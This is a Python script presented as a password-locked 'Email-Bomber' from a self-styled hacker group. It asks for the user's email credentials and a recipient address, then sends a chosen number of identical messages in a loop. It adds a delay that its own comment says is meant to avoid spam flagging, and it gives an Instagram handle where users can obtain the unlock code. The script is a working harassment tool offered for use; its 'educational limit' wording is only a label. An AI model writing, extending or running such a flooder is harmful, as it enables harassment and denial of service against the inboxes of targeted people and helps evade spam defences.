import smtplib
import hashlib
import time
from colorama import Fore, init
import pyfiglet
import sys

# Initialize colorama for colorful console output
init(autoreset=True)

# Constants
MAX_ATTEMPTS = 3
LOCK_DURATION = 30

# Function to generate the logo
def generate_hacker_logo():
    return pyfiglet.figlet_format("CPS", font="slant")

# Function for typewriter effect
def type_writer_effect(message, speed=0.05):
    for char in message:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(speed)
    print()

# Print logo and quotes
def print_intro():
    print(Fore.GREEN + generate_hacker_logo())
    print("\n--- Incoming Message ---\n")
    type_writer_effect(">>> If you've been betrayed in love, make sure to tell me, all characterless are our enemies")
    type_writer_effect(">>> We don't hack to impress, we hack to express.")

# Load the hashed password from a file
def load_password():
    try:
        with open("pass.txt", "r") as f:
            return f.read().strip()
    except FileNotFoundError:
        print(Fore.RED + "Password file 'pass.txt' not found.")
        exit(1)

# Check if the entered password is correct
def check_password(hashed_password):
    attempts = 0
    while attempts < MAX_ATTEMPTS:
        entered_password = input(Fore.YELLOW + "Enter Code To Unlock The Tool: ")
        hashed_entered_password = hashlib.sha256(entered_password.encode()).hexdigest()

        if hashed_entered_password == hashed_password:
            print(Fore.GREEN + "Successfully Unlocked Tool!")
            return True
        else:
            attempts += 1
            print(Fore.RED + "[X] Wrong Code")
            print(Fore.BLUE + '''
   1. Go to Insta and message 
   2. Insta ID: cyberphantomsyndicate
   3. Send message for code
   4. Next time come with code and use this tool
   5. Bye
    ''')
    print(Fore.RED + "Too many incorrect attempts. Tool is temporarily locked.")
    time.sleep(LOCK_DURATION)
    return False

# Function to send email
def send_email(to_email, from_email, password, subject, message, server="smtp.gmail.com", port=587):
    try:
        with smtplib.SMTP(server, port) as smtp:
            smtp.starttls()
            smtp.login(from_email, password)
            email_message = f"Subject: {subject}\n\n{message}"
            smtp.sendmail(from_email, to_email, email_message)
            print(Fore.GREEN + f"Email sent to {to_email}")
    except smtplib.SMTPAuthenticationError:
        print(Fore.RED + "Authentication failed! Check your email and password.")
    except Exception as e:
        print(Fore.RED + f"An error occurred: {e}")

# Main function to handle the bomber tool
def main():
    print(Fore.YELLOW + "=== Email-Bomber ===")
    from_email = input("Enter your email address: ")
    password = input("Enter your email password (or app password): ")
    to_email = input("Enter the recipient's email address: ")
    subject = input("Enter the subject of the email: ")
    message = input("Enter the message content: ")
    try:
        count = int(input("Enter the number of emails to send (educational limit): "))
    except ValueError:
        print(Fore.RED + "Invalid number entered. Exiting.")
        return

    for i in range(count):
        print(Fore.BLUE + f"Sending email {i + 1} of {count}...")
        send_email(to_email, from_email, password, subject, message)
        time.sleep(1)  # Add delay between emails to avoid being flagged as spam

# Run the tool
if __name__ == "__main__":
    print_intro()
    hashed_password = load_password()
    if check_password(hashed_password):
        main()
    else:
        print(Fore.RED + "Exiting program due to failed unlock attempts.")
